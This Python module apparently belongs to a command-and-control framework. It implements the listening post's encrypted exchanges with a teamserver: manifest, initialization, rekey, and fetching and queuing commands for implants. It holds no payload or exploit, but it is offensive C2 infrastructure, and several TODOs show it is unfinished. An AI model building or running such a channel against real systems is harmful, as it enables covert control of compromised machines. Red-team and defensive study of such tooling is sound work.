from lib import instructions
from lib.crypto import asymmetric
from lib import transmit


def send_manifest(frame, listener):
    """
    RECEIVES: Request for a manifest, Teamserver pubkey for next transaction
    SENDS: Listening post manifest, LP pubkey use for next transaction
    SETS: TS pubkey, LP keypair

    :param frame:
    :param listener:
    :return:
    """
    listener.ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    # TODO: HIGH_PRI: Make a listener.manifest
    data = {'component_id': listener.component_id, "cmd": "lpm", "args": [listener.manifest, {"lpk": listener.initial_public_key._public_key}],
            "txid": frame['txid']}
    instruction_frame = instructions.create_instruction_frame(data)
    # TODO: value setting
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def send_initialization(listener):
    """
    RECEIVES: None
    SENDS: Listening post initialization, Listening post pubkey for next transaction
    SETS: LP Keypair, LP State
    :return:
    """
    data = {'component_id': listener.component_id, "cmd": "lpi", "args":[{"lpk": listener.initial_public_key._public_key}]}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_sealed_frame(listener, instruction_frame)
    return reply_frame


def rekey(frame, listener):
    data = {'component_id': listener.component_id, "cmd": "rko", "args":[{"lpk": listener.initial_public_key._public_key}]}

    listener.ts_pubkey = asymmetric.public_key_from_bytes(listener.config.config['crypto']['ts_pk'])
    listener.current_private_key = listener.initial_private_key
    listener.current_public_key = listener.initial_public_key

    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def initialized(frame, listener):
    reply_frame = None
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    listener.listening_post.status = "READY"
    return reply_frame


def noop(frame, listener):
    reply_frame = None
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
    return reply_frame


def request_command(listener):
    """
    RECEIVES: None
    SENDS: Implant commands to run, listening post pubkey for next transaction
    SETS: listener.cmd_queue, LP Keypair

    :param listener:
    :return:
    """
    # TODO: Technically we're shipping the lp privkey for each implant over, we should probably scrub it, but it doesn't really matter since it's gonna rotate after this transaction anyways
    data = {'component_id': listener.component_id, "cmd": "gcmd", "args":[{"lpk": listener.initial_public_key._public_key}, {"implants": listener.implants}]}
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame


def receive_command(frame, listener):
    # TODO: add the command to the implant's queue
    data = {'component_id': listener.component_id, "txid": frame['txid'], "cmd": "rcok", "args":[{"lpk": listener.current_public_key._public_key}]}
    for command in frame['args'][0]:
        listener.cmd_queue.append(command)
    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['tpk']))
    instruction_frame = instructions.create_instruction_frame(data)
    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
    return reply_frame
